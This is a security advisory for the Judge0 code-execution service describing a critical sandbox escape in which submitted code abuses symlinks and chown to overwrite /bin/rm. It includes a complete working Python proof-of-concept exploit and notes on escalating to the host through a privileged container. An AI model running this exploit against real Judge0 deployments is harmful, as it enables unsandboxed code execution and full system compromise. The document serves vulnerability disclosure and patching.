# Sandbox Escape Patch Bypass via chown running on Symbolic Link

Critical

[hermanzdosilovic](/hermanzdosilovic)
published
GHSA-3xpw-36v7-2cmg
Apr 18, 2024

## Package

judge0/judge0
(Docker Hub)

## Affected versions

<= 1.13.0

## Patched versions

>= 1.13.1

## Description

### Summary

The application uses the UNIX `chown` command on an untrusted file within the sandbox. An attacker can abuse this by creating a symbolic link (symlink) to a file outside the sandbox, allowing the attacker to run `chown` on arbitrary files outside of the sandbox.

This vulnerability is not impactful on it's own, but it can be used to bypass the patch for CVE-2024-28185 and obtain a complete sandbox escape.

### Details

As reported in [this advisory](https://github.com/judge0/judge0/security/advisories/GHSA-h9g2-45c8-89cf), there exists a vulnerability in Judge0 that allows users to write to files outside of the sandbox.

On versions <= v1.13.0, this is enough to get code execution. After [this commit](https://github.com/judge0/judge0/commit/846d5839026161bb299b7a35fd3b2afb107992fc), the code runs as the user `judge0` meaning that it is not possible to overwrite many relevant files. To bypass this, symlinks can also be used to exploit the following code:

```
`sudo chown $(whoami): #{run_script} && rm #{run_script}` unless submission.is_project
```

View this source on Github [here](https://github.com/judge0/judge0/blob/v1.13.0/app/jobs/isolate_job.rb#L232).

By creating a symlink named `run_script` we can force the application to `chown` arbitrary files, allowing them to be overwritten with the technique described in [the other advisory](https://github.com/judge0/judge0/security/advisories/GHSA-h9g2-45c8-89cf).

An attacker can leverage this vulnerability to overwrite scripts on the system and gain code execution outside of the sandbox.

### PoC

This proof of concept leverages the vulnerability to overwrite the `/bin/rm` binary. The application executes commands using `/bin/rm` on every submission, so overwriting it will result in the attacker's code being executed outside of the sandbox.

The command that is being run is `touch /tmp/poc`, which is used to verify that the command is being run outside the sandbox as the file is being written to the webserver Docker container's `/tmp` directory.

1. Clone Judge0:
   ```
   git clone git@github.com:judge0/judge0.git
   cd judge0
   ```
2. Checkout to affected commit:
   ```
   git checkout 6fbf16bc338e5c90007f4a56e1229460aeaf5304

   ```
3. Start Judge0 locally:
   ```
   docker compose -f docker-compose.dev.yml up -d --force-recreate
   ```
4. Run the following python script to exploit the vulnerability:
   ```
   #!/usr/bin/env python3

   import requests
   import io
   import zipfile
   import base64
   import stat

   # Target address of Judge0 server
   TARGET = "http://localhost:2358"

   # Command to run outside of the sandbox
   CMD = "touch /tmp/poc"

   # File on the target to overwrite as a means of getting a sandbox escape
   TARGET_FILE = "/bin/rm"

   # Helper to create a zipfile with a single symbolic link inside
   def create_zipfile_with_link(link_name, link_path):
       zip_buffer = io.BytesIO()
       with zipfile.ZipFile(zip_buffer, "a", zipfile.ZIP_DEFLATED, False) as zip_file:
           symlink_file = zipfile.ZipInfo(link_name)
           symlink_file.create_system = 3
           unix_st_mode = stat.S_IFLNK | stat.S_IRUSR | stat.S_IWUSR | stat.S_IXUSR | stat.S_IRGRP | stat.S_IWGRP | stat.S_IXGRP | stat.S_IROTH | stat.S_IWOTH | stat.S_IXOTH
           symlink_file.external_attr = unix_st_mode << 16
           zip_file.writestr(symlink_file, link_path)
       return base64.b64encode(zip_buffer.getvalue()).decode()

   # To avoid running into issues with the gsub filter, we will encode the command as hex and decode it using python3.
   # Decoding and running with python3 doesn't use the filtered characters: $&;<>|`
   hex_payload = CMD.encode().hex()
   encoded_command = 'python3 -c __import__("os").system(bytes.fromhex("{}").decode())'.format(hex_payload)
   encoded_command = encoded_command.replace("(","\\\\(").replace(")","\\\\)").replace('"','\\\\"')

   # Run an initial request that will cause the code to accidentally chown TARGET_FILE.
   # On <= v1.13.0 this is not required as the code runs as root.
   # Required on v1.13.1 as the code runs as judge0 user, meaning we need to chown to be able to write to TARGET_FILE.
   print(requests.post(
       TARGET + "/submissions?wait=true",
       json={
           "source_code": f"mv run runbak; ln -s {TARGET_FILE} run",
           "language_id": 46, # Bash
       },
   ).json()['stdout'])

   # Send the command to write to TARGET_FILE. This will overwrite TARGET_FILE with our sqlite command.
   # The sqlite command calls python3, which will execute our CMD.
   print(requests.post(
       TARGET + "/submissions?wait=true",
       json={
           "source_code": "NOT IMPORTANT",
           "language_id": 82, # SQLite
           "additional_files": create_zipfile_with_link("run", TARGET_FILE),
           "command_line_arguments": f"-cmd '.shell {encoded_command}'"
       },
   ).json()['stdout'])
   ```
5. The command `touch /tmp/poc` will have been executed outside of the sandbox. To confirm this, run the following command:
   ```
   docker compose -f docker-compose.dev.yml exec judge0 ls -l /tmp

   ```

### Impact

An attacker can use this vulnerability to gain unsandboxed code execution on the Docker container running the submission job.

Additionally, the attacker may then escalate their privileges outside of the Docker container due to the Docker container being run using the `privileged` flag as specified in `docker-compose.yml`. This will allow the attacker to mount the Linux host filesystem and the attacker can then write files (for example a malicious cron job) to gain access to the system.

From this point the attacker will have complete access to the Judge0 system including the database, internal networks, the Judge0 webserver, and any other applications running on the Linux host.

# CVSS v3 base metrics

Attack vector:
More severe the more the remote (logically and physically) an attacker can be in order to exploit the vulnerability.

Attack complexity:
More severe for the least complex attacks.

Privileges required:
More severe if no privileges are required.

User interaction:
More severe when no user interaction is required.

Scope:
More severe when a scope change occurs, e.g. one vulnerable component impacts resources in components beyond its security scope.

Confidentiality:
More severe when loss of data confidentiality is highest, measuring the level of data access available to an unauthorized user.

Integrity:
More severe when loss of data integrity is the highest, measuring the consequence of data modification possible by an unauthorized user.

Availability:
More severe when the loss of impacted component availability is highest.
